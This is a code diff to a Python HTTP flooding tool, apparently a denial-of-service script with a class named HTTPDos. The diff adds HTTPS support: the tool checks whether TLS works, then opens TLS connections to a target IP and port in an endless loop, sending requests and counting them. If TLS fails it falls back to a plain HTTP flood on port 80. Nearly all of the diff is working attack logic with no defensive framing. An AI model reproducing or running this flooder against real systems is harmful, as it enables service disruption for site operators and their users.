@@ -1,4 +1,5 @@
 import socket
+import ssl
 import random
 import json
 import os
@@ -20,6 +21,7 @@ class HTTPDos():
         self.http_method = http_method
         self.udp_size_bytes = udp_size_bytes
         self.thread_number = thread_number
+        self.ssl_available = False
 
     def http_flood(self):
         """
@@ -37,17 +39,68 @@ class HTTPDos():
         time.sleep(1)
         color_text('yellow', '[+] Start sending')
 
-        counter = itertools.count(1)
-        while True:
-            sock = socket.socket(socket.AF_INET, TCP)
-            sock.connect((self.target_ip, self.target_port))
-            sock.send(http_method)
-            sock.close()
-            i = next(counter)
+        counter = itertools.count(1)  # counter
 
-            if i % 10_000 == 0:
-                sys.stdout.write(f'{i} request send !\r\n')
-                sys.stdout.flush()
+        if self.protocol == 'https':
+            self.ssl_available = self.test_ssl_connection()
+
+        if  self.protocol == 'https' and self.ssl_available:
+
+            # Create ssl certificat
+            context = ssl.create_default_context()
+            while True:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                ssl_sock = context.wrap_socket(
+                    sock, server_hostname=self.target_ip)
+
+                # connection
+                ssl_sock.connect((self.target_ip, self.target_port))
+                ssl_sock.send(self.get_http_request())
+                ssl_sock.close()
+
+                i = next(counter)
+
+                if i % 1000 == 0:
+                    sys.stdout.write(f'{i} request send !\r\n')
+                    sys.stdout.flush()
+        else:
+            if self.protocol == 'https':  # if https failure, testing http
+                color_text(
+                    'green', f'[*] {self.target_ip} on port {self.target_port} is available sending request !')
+            while True:
+                sock = socket.socket(socket.AF_INET, TCP)
+                sock.connect((self.target_ip, self.target_port))
+                sock.send(http_method)
+                sock.close()
+
+                i = next(counter)
+
+                if i % 10_000 == 0:
+                    sys.stdout.write(f'{i} request send !\r\n')
+                    sys.stdout.flush()
+
+    def test_ssl_connection(self):
+        """Fonction pour tester si SSL est disponible sur le serveur"""
+        try:
+            context = ssl.create_default_context()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            ssl_sock = context.wrap_socket(
+                sock, server_hostname=self.target_ip)
+
+            # connection
+            ssl_sock.connect((self.target_ip, self.target_port))
+            ssl_sock.send(self.get_http_request())
+            ssl_sock.close()
+            
+            return True  # SSL valid
+        except:
+            color_text(
+                'red', '\r\n[!] HTTPS is not available, test on http port 80 !\r\n')
+            self.target_port = 80  # if https is not valide, test on http port 80 by default
+
+            return False
 
     def get_http_request(self):
         random_ip = self.http_random_ip()
